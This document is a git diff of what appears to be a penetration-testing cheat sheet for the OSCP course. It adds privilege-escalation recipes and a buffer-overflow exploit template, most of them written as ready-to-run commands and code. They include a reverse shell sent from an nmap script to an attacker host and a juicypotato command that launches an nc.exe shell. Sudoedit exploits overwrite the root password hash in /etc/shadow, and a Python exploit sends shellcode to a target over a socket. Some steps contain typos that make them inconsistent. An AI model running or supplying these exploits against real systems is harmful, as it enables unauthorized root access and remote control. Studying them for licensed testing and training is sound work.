@@ -201,7 +201,7 @@ C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf #
 C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\BACKUP\master.mdf # Backup DB
 # Extract sa hash from MDF: https://blog.xpnsec.com/extracting-master-mdf-hashes/
 
-# MySQL User-Defined Function (UDF) exploit (https://www.exploit-db.com/exploits/1518)
+# MySQL User-Defined Function (UDF) exploit (https://www.exploit-db.com/exploits/1518) - Typically for local privilege escalation!
 echo "import os; os.setgid(0); os.setuid(0); os.system('/bin/bash')" >> suid.py
 gcc -g -c raptor_udf2.c
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
@@ -260,14 +260,13 @@ There are 3 primary categories to look out for:
 * **Vulnerable Software:** Non-default software located on system is vulnerable
 * **Kernel Exploit:** A kernel exploit is available to direct perform LPE
 
-Once relatively certain on LPE vector, search online and attempt to apply exploit.
+Once relatively certain on LPE vector, search online and attempt to apply exploit. Exploits that are widely applicable / easy to perform are outlined below as well.
 
 ### 2.1 Linux Local Privilege Escalation ###
 
 Standard commands to enumerate the system:
 
 ```sh
-
 # Current user and privileges
 id      # Information of current user e.g. membership in groups (sudo etc.)
 sudo -l # List of commands current user can execute as sudo
@@ -346,11 +345,45 @@ w                       # Other users logged onto the system
 cat /etc/motd           # Message of the day, possibly triggered on login
 ```
 
+Nmap exploit (if sudo -l allows for nmap)
+```sh
+# Check for nmap version and sudo nmap ability:
+nmap -V && sudo -l
+
+# Nmap 2.02 to 5.21 Interactive shell
+nmap --interactive
+> !sh 
+
+# Nmap > 5.21 - Send a reverse shell back to <ATTACKER IP>:<LISTENING PORT> via Nmap Script
+echo 'os.execute("/bin/bash >& /dev/tcp/<ATTACKER IP>/<LISTENING PORT> 0>&1")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+```
+
 Sudoedit exploit (if "sudo -l" allows for sudoedit)
 ```sh
-# Check for sudoedit version
+# Check for sudo version and sudo privileges of current user
+sudo -v && sudo -l
 
+# LPE for sudo (1.6.x < 1.69p21 / 1.7.x < 1.7.2p4) (https://www.exploit-db.com/exploits/11651)
+# Need: <user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /path/to/file.ext
+cd /tmp
+cat << EOF >> /tmp/sudoedit
+#!/bin/sh
+su
+/bin/su
+EOF
+chmod a+x /tmp/sudoedit             # Create /tmp/sudoedit for "sudo su"
+sudo ./sudoedit /path/to/file.ext   # Run /tmp/sudoedit instead
 
+# LPE for sudo <= 1.8.14 (https://www.exploit-db.com/exploits/37710)
+# Need: Fully interactive shell
+# Need: <user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /path/to/*/*/file.ext
+cd /path/to/some_writable_folder                        # First wildcard = some_writable_folder
+mkdir newdir                                            # Second wildcard = newdir
+ln -s /etc/shadow file.ext                              # file.txt now points symlinks to /etc/shadow
+openssl passwd -6 -salt salt letmein                    # Geenerate SHA-256 hash for "letmein" (see below)
+sudoedit /path/to/some_writable_folder/newdir/file.txt  # Editing /etc/shadow
+# Modify root hash to: $6$salt$MFNUp7F4YTbLV4n2ACWMTOp6oLDg9indnt.hbnX9S7Qx1YhgfGxYg0dFJARrRXwCa0ghc.86/AIIYQqBzFfh/.
+sudo su                                                 # Log in as root with "letmin" as password
 ```
 
 ### 2.2 Windows Local Privilege Escalation ###
@@ -447,7 +480,7 @@ REM Check for BITS (pref.) service running, others applicable are OK too
 wmic service get name,startname     
 REM Search for CLSID of a desired servie on http://ohpe.it/juicy-potato/CLSID/
 REM Send reverse shell back to ourselves using downloaded nc.exe
-juicypotato.exe -l 1337 -p "C:\windows\system32\cmd.exe" -a "/c C:\path\to\nc.exe <ATTACKER IP> <LISTNEING PORT> -e cmd.exe" -t * -c {CLSID}
+juicypotato.exe -l 1337 -p "C:\windows\system32\cmd.exe" -a "/c C:\path\to\nc.exe <ATTACKER IP> <LISTNEING PORT> -e cmd.exe" -t * -c {<SERVICE CLSID>}
 ```
 
 afd.sys Kernel Exploit (MS11-046, x86, Unpatched Windows 7 / Server 2008 or earlier)
@@ -490,7 +523,7 @@ certutil -urlcache -split -f http://<IP>:<PORT>/41020.exe 41020.exe
 
 COMahawk Local Privilege Escalation (Windows 10 Build 1803 < 1903)
 ```bat
-REM Reference to EDB 47684, assume exploit saved as "exploit.exe
+REM Reference to EDB 47684, assume exploit saved as "exploit.exe"
 exploit.exe             REM Run Exploit
 net users tomahawk      REM Check "tomahawk" added as Administrator
 
@@ -747,3 +780,71 @@ python3 -m sshuttle -r <USER>@<REMOTE IP>:<REMOTE PORT> <SUBNET>/<MASK>
 ```
 
 As an additional note, SOCKS5 proxy is on layer 5 of OSI model, supporting higher-level protocols (e.g. HTTP), as well as IPv4/6, TCP and UDP. Therefore protocols like ICMP will fail (e.g. ping / traceroute etc.) 
+
+### 3.5 Steganography ###
+
+Media files can possible hide files. We can view metadata, or extract information, e.g. using steghide as folows:
+```sh
+steghide info <IMAGE FILE>          # Look for embedded text / file-content
+stehide extract -sf <IMAGE FILE>    # Extract text / file-content
+```
+
+## 4 Buffer Overflow Attack ##
+
+In the context of OSCP PWK-2020, the focus appears to be on using [Immunity Debugger](https://www.immunityinc.com/products/debugger/) on Windows PE32 (x86) binaries (henceforth termed EXE) as opposed to others (e.g. gdb on ELF). This section seek to streamline and simplify that process.
+
+A buffer overflow attack tends to follow a standard methodology.
+1. Define format / script to send payload to EXE
+2. Check for vulnerability by sending arbitrary large payload to EXE
+3. Create MSF pattern as payload, send payload to EXE
+4. Use ImmunityDebugger to record EIP value, calculate pattern offset to EIP
+5. Overwrite EIP with "jmp esp" (\xff\xe4) located in "vulnerable modules"
+6. Use msfvenom to generate shellcode to execute upon overflow
+7. Pad shellcode with nop-sled to improve exploit reliability
+8. Run the exploit and hope to get reverse shell
+
+The following is a sample python template, with appropriate commands to send the payload to an external listening server / as argument to the EXE:
+```py
+import socket
+
+# (1) Calculation of EIP offset
+# Create MSF pattern (e.g. length10000): !mona pattern_create 10000
+#   - MSF: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10000
+# Compute Offset of EIP: !mona pattern_offset <EIP's value in ASCII>
+#   - MSF: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP's value in ASCII> -l 10000
+eip_offset = 10000
+
+# (2) Overwrite buffer with junk until we reach EIP
+# Note: It is possible to hide the shellcode here too if necessary!
+junk = b"A" * eip_offset
+
+# (3) EIP points to "jmp esp" to start executing code on stack
+# - List modules: !mona modules
+#   - Find module with "Rebase, SafeSEH, ASLR, NXCompat" disabled if possible
+# - Find "jmp esp" address in a module: !mona find -s '\xff\xe4' -m <MODULE>
+#   - Note: Make sure address does NOT have '\x00' = null byte in payload!
+eip = b"\x12\x34\x56\x78"
+
+# (4) Define NOP-sled to improve reliability
+nop = b"\x90" * 40
+
+# (5) [Reverse Shell] Shellcode
+# msfvenom -p windows/(x64??)/shell_reverse_tcp lhost=<ATTACKER IP> lport=<LISTENING PORT> -b '\x00' -f python
+# Note: additional encoding (e.g. -e x86/alpha_upper) or specification of bad characters (e.g. -b '...') may be required for certain applications...
+buf = b""
+
+# Initial payload = MSF pattern
+# Final payload   = [AAAAAA...AAA][EIP][NOP Sled][Shellcode]
+# Note: Check for enough space after EIP. Changed if required (but EIP is fixed!)
+payload = junk + eip + nop + buf
+
+# Possible Scenario 1: Sending payload to a port 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("<TARGET IP>", <PORT>))
+s.sendall(payload)
+s.close()
+
+# Possible Scenario 2: Sending payload as 1st argument to binary
+#os.system('<EXE> \"' + payload + '\"')
+
+```
